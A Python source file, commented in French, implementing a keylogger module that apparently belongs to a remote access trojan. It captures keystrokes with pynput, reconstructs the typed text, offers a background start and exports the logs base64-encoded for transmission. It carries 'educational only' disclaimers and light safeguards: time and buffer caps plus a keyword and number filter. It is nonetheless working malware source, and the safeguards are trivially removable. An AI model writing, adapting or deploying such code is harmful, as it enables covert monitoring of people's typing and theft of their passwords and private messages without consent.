"""
Keylogger Module - Enregistrement de frappes clavier
⚠️ USAGE ÉDUCATIF UNIQUEMENT - Implémentation éthique avec garde-fous ⚠️
Inspiré des techniques de surveillance des RATs modernes
"""

import os
import time
import threading
from datetime import datetime, timedelta
from typing import Dict, Any, List, Optional
import logging

try:
    import pynput
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

logger = logging.getLogger(__name__)

class KeyloggerModule:
    """
    Module de keylogging éthique avec limitations de sécurité
    
    GARDE-FOUS IMPLÉMENTÉS:
    - Durée maximale d'enregistrement
    - Filtrage des données sensibles
    - Indication visuelle d'activité
    - Logs d'audit
    """
    
    def __init__(self):
        self.is_running = False
        self.listener = None
        self.keystroke_buffer = []
        self.start_time = None
        self.total_keystrokes = 0
        
        # Garde-fous de sécurité
        self.MAX_DURATION = 600  # 10 minutes maximum
        self.MAX_BUFFER_SIZE = 1000  # 1000 frappes maximum
        self.SENSITIVE_PATTERNS = [
            'password', 'passwd', 'pwd', 'pin', 'ssn', 'cvv', 
            'credit', 'card', 'bank', 'account', 'social'
        ]
        
        # Statistiques
        self.sessions_count = 0
        self.last_session_duration = 0
        
        if not PYNPUT_AVAILABLE:
            logger.warning("Module pynput non disponible - keylogger désactivé")
    
    def start(self) -> Dict[str, Any]:
        """Démarre l'enregistrement des frappes clavier"""
        try:
            if not PYNPUT_AVAILABLE:
                return {
                    'status': 'error',
                    'output': 'Module pynput requis pour le keylogger'
                }
            
            if self.is_running:
                return {
                    'status': 'error',
                    'output': 'Keylogger déjà en cours d\'exécution'
                }
            
            # Réinitialisation du buffer
            self.keystroke_buffer.clear()
            self.start_time = time.time()
            self.is_running = True
            self.sessions_count += 1
            
            # Démarrage du listener
            self.listener = keyboard.Listener(on_press=self._on_key_press)
            self.listener.start()
            
            # Thread de surveillance pour les garde-fous
            monitor_thread = threading.Thread(target=self._monitor_session)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            logger.info("Keylogger démarré avec garde-fous de sécurité")
            
            return {
                'status': 'success',
                'output': (
                    f'Keylogger démarré (session #{self.sessions_count})\\n'
                    f'⚠️ LIMITATIONS DE SÉCURITÉ ACTIVES ⚠️\\n'
                    f'- Durée max: {self.MAX_DURATION}s\\n'
                    f'- Buffer max: {self.MAX_BUFFER_SIZE} frappes\\n'
                    f'- Filtrage des données sensibles activé'
                ),
                'session_id': self.sessions_count,
                'max_duration': self.MAX_DURATION
            }
            
        except Exception as e:
            logger.error(f"Erreur démarrage keylogger: {e}")
            return {
                'status': 'error',
                'output': f'Erreur lors du démarrage: {str(e)}'
            }
    
    def stop(self) -> Dict[str, Any]:
        """Arrête l'enregistrement des frappes clavier"""
        try:
            if not self.is_running:
                return {
                    'status': 'error',
                    'output': 'Keylogger non actif'
                }
            
            # Arrêt du listener
            if self.listener:
                self.listener.stop()
                self.listener = None
            
            # Calcul des statistiques
            if self.start_time:
                self.last_session_duration = time.time() - self.start_time
            
            self.is_running = False
            keystrokes_captured = len(self.keystroke_buffer)
            
            logger.info(f"Keylogger arrêté - {keystrokes_captured} frappes capturées")
            
            return {
                'status': 'success',
                'output': (
                    f'Keylogger arrêté\\n'
                    f'Durée de session: {self.last_session_duration:.1f}s\\n'
                    f'Frappes capturées: {keystrokes_captured}\\n'
                    f'Total sessions: {self.sessions_count}'
                ),
                'session_duration': self.last_session_duration,
                'keystrokes_captured': keystrokes_captured
            }
            
        except Exception as e:
            logger.error(f"Erreur arrêt keylogger: {e}")
            return {
                'status': 'error',
                'output': f'Erreur lors de l\'arrêt: {str(e)}'
            }
    
    def get_logs(self) -> Dict[str, Any]:
        """Récupère les logs de frappe avec filtrage de sécurité"""
        try:
            if not self.keystroke_buffer:
                return {
                    'status': 'info',
                    'output': 'Aucune frappe enregistrée'
                }
            
            # Reconstruction des frappes en texte
            logs = self._reconstruct_text()
            
            # Filtrage des données sensibles
            filtered_logs = self._filter_sensitive_data(logs)
            
            # Statistiques
            stats = {
                'total_keystrokes': len(self.keystroke_buffer),
                'session_duration': self.last_session_duration,
                'special_keys': sum(1 for entry in self.keystroke_buffer if entry['type'] == 'special'),
                'filtered_content_length': len(filtered_logs)
            }
            
            return {
                'status': 'success',
                'output': f'Logs récupérés ({len(self.keystroke_buffer)} frappes)',
                'logs': filtered_logs,
                'statistics': stats,
                'warning': '⚠️ Contenu filtré pour la sécurité ⚠️'
            }
            
        except Exception as e:
            logger.error(f"Erreur récupération logs: {e}")
            return {
                'status': 'error',
                'output': f'Erreur lors de la récupération: {str(e)}'
            }
    
    def get_statistics(self) -> Dict[str, Any]:
        """Récupère les statistiques du keylogger"""
        try:
            current_session_duration = 0
            if self.is_running and self.start_time:
                current_session_duration = time.time() - self.start_time
            
            stats = {
                'is_running': self.is_running,
                'sessions_count': self.sessions_count,
                'current_session_duration': current_session_duration,
                'last_session_duration': self.last_session_duration,
                'current_buffer_size': len(self.keystroke_buffer),
                'max_buffer_size': self.MAX_BUFFER_SIZE,
                'max_duration': self.MAX_DURATION,
                'total_keystrokes_ever': self.total_keystrokes
            }
            
            return {
                'status': 'success',
                'output': 'Statistiques keylogger récupérées',
                'data': stats
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'output': f'Erreur statistiques: {str(e)}'
            }
    
    def start_background(self):
        """Démarre le keylogger en arrière-plan (pour usage éducatif)"""
        if PYNPUT_AVAILABLE and not self.is_running:
            self.start()
    
    def _on_key_press(self, key):
        """Gestionnaire d'événement de frappe clavier"""
        try:
            # Vérification des limites de buffer
            if len(self.keystroke_buffer) >= self.MAX_BUFFER_SIZE:
                logger.warning("Buffer keylogger plein - arrêt automatique")
                self.stop()
                return False
            
            # Enregistrement de la frappe
            timestamp = datetime.now()
            
            if hasattr(key, 'char') and key.char is not None:
                # Caractère normal
                self.keystroke_buffer.append({
                    'type': 'char',
                    'value': key.char,
                    'timestamp': timestamp.isoformat(),
                    'time_since_start': time.time() - self.start_time
                })
            else:
                # Touche spéciale
                key_name = str(key).replace('Key.', '')
                self.keystroke_buffer.append({
                    'type': 'special',
                    'value': key_name,
                    'timestamp': timestamp.isoformat(),
                    'time_since_start': time.time() - self.start_time
                })
            
            self.total_keystrokes += 1
            
        except Exception as e:
            logger.error(f"Erreur capture frappe: {e}")
    
    def _monitor_session(self):
        """Thread de surveillance pour les garde-fous de sécurité"""
        while self.is_running:
            try:
                # Vérification de la durée maximale
                if self.start_time and (time.time() - self.start_time) >= self.MAX_DURATION:
                    logger.warning("Durée maximale atteinte - arrêt automatique du keylogger")
                    self.stop()
                    break
                
                # Vérification de la taille du buffer
                if len(self.keystroke_buffer) >= self.MAX_BUFFER_SIZE:
                    logger.warning("Buffer plein - arrêt automatique du keylogger")
                    self.stop()
                    break
                
                time.sleep(1)  # Vérification chaque seconde
                
            except Exception as e:
                logger.error(f"Erreur monitoring keylogger: {e}")
                break
    
    def _reconstruct_text(self) -> str:
        """Reconstruit le texte à partir des frappes enregistrées"""
        try:
            text_lines = []
            current_line = []
            
            for entry in self.keystroke_buffer:
                if entry['type'] == 'char':
                    current_line.append(entry['value'])
                elif entry['type'] == 'special':
                    key = entry['value']
                    
                    if key == 'enter':
                        text_lines.append(''.join(current_line))
                        current_line = []
                    elif key == 'space':
                        current_line.append(' ')
                    elif key == 'tab':
                        current_line.append('\\t')
                    elif key == 'backspace' and current_line:
                        current_line.pop()
                    elif key in ['shift', 'ctrl', 'alt', 'cmd']:
                        # Ignorer les touches de modification
                        continue
                    else:
                        current_line.append(f'[{key}]')
            
            # Ajouter la ligne courante si elle n'est pas vide
            if current_line:
                text_lines.append(''.join(current_line))
            
            return '\\n'.join(text_lines)
            
        except Exception as e:
            logger.error(f"Erreur reconstruction texte: {e}")
            return "Erreur lors de la reconstruction du texte"
    
    def _filter_sensitive_data(self, text: str) -> str:
        """
        Filtre les données potentiellement sensibles
        
        GARDE-FOU DE SÉCURITÉ: Remplace les patterns sensibles par [FILTERED]
        """
        try:
            filtered_text = text.lower()
            
            # Filtrage des patterns sensibles
            for pattern in self.SENSITIVE_PATTERNS:
                if pattern in filtered_text:
                    # Remplacer les 20 caractères suivant le pattern par [FILTERED]
                    import re
                    pattern_regex = re.compile(f'{pattern}.{{0,20}}', re.IGNORECASE)
                    text = pattern_regex.sub(f'{pattern.upper()}: [FILTERED]', text)
            
            # Filtrage des séquences numériques longues (potentiels numéros de carte)
            import re
            text = re.sub(r'\\b\\d{12,19}\\b', '[FILTERED_NUMBER]', text)
            
            # Filtrage des motifs d'email/mots de passe
            text = re.sub(r'\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b', '[FILTERED_EMAIL]', text)
            
            # Limitation de la longueur pour éviter les fuites massives
            if len(text) > 2000:
                text = text[:2000] + "\\n\\n[CONTENU TRONQUÉ POUR LA SÉCURITÉ]"
            
            return text
            
        except Exception as e:
            logger.error(f"Erreur filtrage: {e}")
            return "[ERREUR DE FILTRAGE - CONTENU MASQUÉ]"
    
    def clear_logs(self) -> Dict[str, Any]:
        """Efface les logs de frappe"""
        try:
            buffer_size = len(self.keystroke_buffer)
            self.keystroke_buffer.clear()
            
            return {
                'status': 'success',
                'output': f'Logs effacés ({buffer_size} frappes supprimées)'
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'output': f'Erreur lors de l\'effacement: {str(e)}'
            }
    
    def export_logs(self, format: str = 'json') -> Dict[str, Any]:
        """
        Exporte les logs dans un format spécifique
        
        Args:
            format: Format d'export ('json', 'csv', 'txt')
        """
        try:
            if not self.keystroke_buffer:
                return {
                    'status': 'error',
                    'output': 'Aucun log à exporter'
                }
            
            # Filtrage préalable
            filtered_logs = self._filter_sensitive_data(self._reconstruct_text())
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            
            if format.lower() == 'txt':
                content = f"Keylogger Export - {timestamp}\\n"
                content += "=" * 50 + "\\n"
                content += f"Session: {self.sessions_count}\\n"
                content += f"Duration: {self.last_session_duration:.1f}s\\n"
                content += f"Keystrokes: {len(self.keystroke_buffer)}\\n"
                content += "=" * 50 + "\\n\\n"
                content += filtered_logs
                filename = f"keylogger_export_{timestamp}.txt"
                
            elif format.lower() == 'json':
                import json
                export_data = {
                    'export_timestamp': timestamp,
                    'session_info': {
                        'session_id': self.sessions_count,
                        'duration': self.last_session_duration,
                        'keystrokes_count': len(self.keystroke_buffer)
                    },
                    'filtered_content': filtered_logs,
                    'warning': 'Content has been filtered for security'
                }
                content = json.dumps(export_data, indent=2)
                filename = f"keylogger_export_{timestamp}.json"
                
            else:
                return {
                    'status': 'error',
                    'output': f'Format non supporté: {format}'
                }
            
            # Encodage base64 pour transmission
            import base64
            encoded_content = base64.b64encode(content.encode('utf-8')).decode('utf-8')
            
            return {
                'status': 'success',
                'output': f'Export créé: {filename}',
                'file_data': encoded_content,
                'filename': filename,
                'format': format
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'output': f'Erreur lors de l\'export: {str(e)}'
            }